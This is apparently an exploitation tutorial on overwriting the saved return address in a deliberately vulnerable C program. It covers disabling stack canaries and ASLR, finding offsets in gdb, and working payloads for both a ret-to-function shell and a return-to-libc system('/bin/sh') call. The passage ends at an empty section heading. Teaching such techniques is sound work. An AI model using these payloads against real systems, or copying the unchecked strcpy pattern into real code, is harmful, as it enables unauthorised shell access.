# Overwriting the RIP/EIP

sources:
https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
https://stackoverflow.com/questions/44938745/rodata-section-loaded-in-executable-page \
https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virtual-address-in-rodata-and-rodata1 \
https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux \
https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization \
https://en.wikipedia.org/wiki/Address_space_layout_randomization \
https://www.ret2rop.com/2018/08/return-to-libc.html

When a function is called, a return address is saved in the stack so the
program knows where to take instructions from after the function exits, by
loading this address to the Instruction Pointer.

With `first_buffer_overflow.c` we learned how to overwrite a variable below
the buffer to get access to a part of the program, but if we can overwrite
the RIP (or EIP) we will be able to go to any part of the program
after a function is called.

Overwriting the RIP to redirect the execution flow of the program is the
key concept in Return-Oriented Programming (ROP).

Our "victim" will be the program at `rip.c`:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void impossible_shell(){

	system("/bin/sh");
}

int password_is_correct(char* passwd){

	char buffer[16];
	strcpy(buffer, passwd);

	return !strncmp(buffer, "passwd1", 16);
}

int main(int argc, char* argv[]){

	if( password_is_correct(argv[1]) ){

		printf("PASSWORD IS CORRECT!\n");
		printf("i don't feel like giving you a shell though😝\n");

	} else {

		printf("PASSWORD IS INCORRECT!\n");
		printf("try harder next time\n");
	}
}

```

It is important to note some stuff about the program:

* The function *impossible_shell* is **never** called by the program.
We are going to call it anyway :wink:

* The input is given directly from the command line. If scanf was used
the only difference is that we would use some command line trick to
redirect the desired input to the program. The concepts used for the actual
ROP wouldn't change.

## The Compilation

Just like in `first_buffer_overflow.c`, we will compile with some flags
to allow us to exploit the program easily. We will introduce some new
flags and gradually compile without some of them as we understand how
to bypass the defenses they disable.

## Easiest Cenario

### The Compilation

We will compile using ASLR disabled (explained below)
`gcc rip.c -m32 -no-pie -fno-stack-protector -o rip`:

* `-m32` - compile to 32 bits. The code will still run on 64 bit
architectures. If your compilation throws an error, try installing the
`libc6-dev-i386` package in Linux. 32 bit addresses are smaller and
usually don't contain null bytes, which we can't write to an string.

* `-no-pie` - force to produce position-dependent code. When the code
is position-independent the OS usually puts it in a random location in
memory. We will first execute the program to discover relevant
addresses and then execute again to use them, and without this flag
the addresses would be different between executions. Without ASLR, the
heap and libraries could still have random addresses.

* `-fno-stack-protector` - disables canary. Canary is a defense technique
against buffer overflow that basically puts a random value in the stack
and check if it changes at some point. If it does is because a buffer
overflow overwrote it and the program is terminated.

* `-o` - what comes after this flag will be the name of our executable.

* Disable ASLR - ASLR stands for Address Space Layout Randomization,
and it is responsible for randomly arranging the address space
for the stack, heap and libraries. Without `-no-pie` everything would
be mapped to the same place, but the binary itself would store offsets
instead of addresses, which would become addresses when the program is
called. To disable ASLR:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

The ASLR is automatically restore on reboot, but you can also do it
manually:

```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Or you can just use the `Makefile`'s  `first` rule with `make first`,
just mind that it doesn't disable ASLR, for that please follow the
instructions above.

### Plan of Attack

As stated before, ROP is all about redirecting the flow of execution
by overwriting the return address in the stack. All we need to make
it happen is the address to `impossible_shell` and how far our
buffer is from the return address.

Mind that we are not going to overwrite the return address from `main`,
since the buffer is actually in the `password_is_correct` stack frame.

### Getting r00t

First, launch gdb with `gdb -q rip`. We will use the `info functions`
command in `gdb` to search for `impossible_shell`.

```
info functions impossible_shell
```

Obs .: `info functions` does the search using regex. Just writing
`impossible` would do the job!

You should have an output like this one (the address is probably
different though):

```
All functions matching regular expression "impossible":

Non-debugging symbols:
0x0804849b  impossible_shell
```

We now only need the distance from the buffer to the return address.
To get it, all we really need is to run
`disassemble password_is_correct` to peek under the hood.

We know that our buffer is used as argument for `strcpy` and
`strncmp`,  so we just need to check what address (from the stack)
pushed to the stack before these functions are called.

Indeed, just before `strcpy` is called we have:

```
0x0804852c <+21>:	push   DWORD PTR [ebp+0x8]
0x0804852f <+24>:	lea    eax,[ebp-0x18]
0x08048532 <+27>:	push   eax
```

And just before calling `strncmp`:

```
0x08048540 <+41>:	lea    eax,[ebx-0x1971]
0x08048546 <+47>:	push   eax
0x08048547 <+48>:	lea    eax,[ebp-0x18]
0x0804854a <+51>:	push   eax

```

Obs .: In this case, all the information we just gathered using
`gdb` could be fetched using `objdump -d -M intel-mnemonic rip`.

In both snippets, the common address is **ebp-0x18**. Which means
that after the 18th byte our buffer start writing EBP
(which has 4 bytes) and then our target: EIP (also 4 bytes).

All that is left to do now is write the payload and give it
as the input to the program:

```
./rip `python -c "print(b'A'*0x18 + b'BBBB' + b'\x9b\x84\x04\x08')"`
```
Or, using python3:
```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x9b\x84\x04\x08')"`
```

Here we have 24 (0x18) bytes to fill the space between the EBP
and the start of the buffer, after that we have `'BBBB'` to fill
the EBP, and finally we have the value that will be the new
Return Address.

Obs.: My machine uses little-endian, that's why the address byte
order is backwards. Yours is probably too (most are nowadays)

Running any of the above commands (with the proper addresses)
should grant you a shell!

### Getting Shell in the Wild

Although we managed to get the shell, our methodology could be improved
to work in other scenarios.

1. What if `impossible_shell` was a more complex function?

2. What if `system` called "/bin/cal" instead?

3. What if `system` wasn't called at all?

The answer: Return to `libc`.

`libc`, the C standard library is the one used for functions like
`printf`, `scanf`, `system` and many more.

Why this help us? When a library is loaded, it is *entirely* loaded.
This means that even if a program uses only `printf`, the entire
libc is accessed by the program.

If we can get a shell using only libc, this means we can get a
shell in most C programs with a buffer overflow vulnerability.

So, this is how we are going to answer:

1. Doesn't matter, let's just call `system` directly from `libc`!

2. There is a "/bin/sh" string in `libc`, let's just use it
instead!

3. Doesn't matter either! We can also call `system` from `libc`!

Of course, although our current setup makes this easier, we will
see how far we can go with the barriers we disabled afterwards.

To get the addresses from `libc` we need to run the program in
`gdb` and break at some point.

```
(gdb) break main
Breakpoint 1 at 0x804851e
(gdb) run 
Breakpoint 1, 0x0804851e in main ()
(gdb)
```

Now `libc` is loaded and we can get relevant info from it. To
get the `system` address type:

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e36850 <system>
```

And type that value where the `impossible_shell` address was before:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7')"`
sh: 1: ��������: not found
Segmentation fault
```

Well, that didn't work! We forgot to pass an argument to `system`.
Previously, `impossible_shell` pushed the address of "/bin/sh",
but now we are the ones doing the heavy-lifting.

Let's take a look at our current payload:

```
b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + 'garbage value1' + 'garbage value2'
```

`b'A'*0x18` is just so we can fill the stack and overwrite the actual
important stuff, just like `b'BBBB'`. When `password_is_correct` ends its
execution, `b'\x50\x68\xe3\xf7'` get written to EIP, ESP points to
'garbage value1' and `impossible_shell` is called. In `impossible_shell`,
EBP is pushed to stack. Are you following? At this point we are in the
`impossible_shell` and the stack looks like this:

Higher Addresses (Bottom of the stack) |
---------------------------------------|
garbage value2 (argument) |
garbage value1 (return address) |
saved EBP (pushed `impossible_shell`) |
Lower Addresses (Top of the stack) |

As you can see, if we write the address of "/bin/sh" to 'garbage value2'
it will be used as an argument to `system`:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'CCCC' + b'\xc8\x97\xf5\xf7')"`
```

## Dealing With a 0x00 in the Addresses
